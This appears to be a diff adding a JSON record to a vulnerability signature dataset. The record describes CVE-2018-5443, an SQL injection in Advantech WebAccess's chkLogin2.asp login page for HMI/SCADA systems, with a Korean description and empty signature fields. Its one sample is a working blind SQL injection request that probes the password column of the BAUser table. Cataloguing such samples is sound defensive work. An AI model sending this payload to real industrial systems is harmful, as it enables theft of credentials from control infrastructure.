@@ -1,0 +1,9 @@
+{
+	"Name": "Advantech WebAccess Node chkLogin2 SQL Injection",
+	"Description": "- HMI(Human-Machine Interfaces) 및 SCADA (Supervisory Control and Data Acquisition) 시스템을 위한 웹 기반 소프트웨어 패키지\n- /broadWeb/BEMS/include/ chkLogin2.asp에 전달되는 user 및 username 매개변수의 값에 SQL Injection 공격 구문에 대한 검증이 제대로 이루어지지 않아 발생\n-  원격의 공격자는 악의적으로 조작된 요청문을 영향받는 서버에 보냄으로 공격수행\n-  공격 성공 시, 민감한 정보가 유출",
+	"References": ["CVE-2018-5443"],
+	"Samples": [
+		"POST /broadWeb/BEMS/include/chkLogin2.asp?user=1'+OR+IIF((select%20top%201%20LEN(PASSWORD)%20from%20BAUser)=1,'2','1')='1'%16 HTTP/1.1\nHost: 1.1.1.1\nReferer: https://1.1.1.1/broadWeb/user/AdminPg.asp\nCookie: 4bb4a09f511681369671a08beff228=etiq3m7caed6ekcpb1m9tdc6v;\nContent-Length: 23\nusername=11&password=12"],
+	"Keywords": [],
+	"Signature": []
+}
